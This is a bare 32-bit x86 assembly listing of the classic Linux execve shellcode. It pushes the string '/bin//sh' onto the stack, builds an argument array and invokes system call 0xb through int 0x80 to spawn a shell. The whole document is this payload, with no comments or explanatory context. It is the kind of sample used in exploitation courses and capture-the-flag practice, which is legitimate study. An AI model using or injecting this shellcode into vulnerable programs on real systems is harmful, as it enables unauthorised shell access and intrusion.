BITS 32  

xor edx, edx  
push edx  
push 0x68732f2f  
push 0x6e69622f  

mov ebx, esp  

push edx  
push ebx  

mov ecx, esp  

xor eax, eax  
mov al, 0xb  

int 0x80  
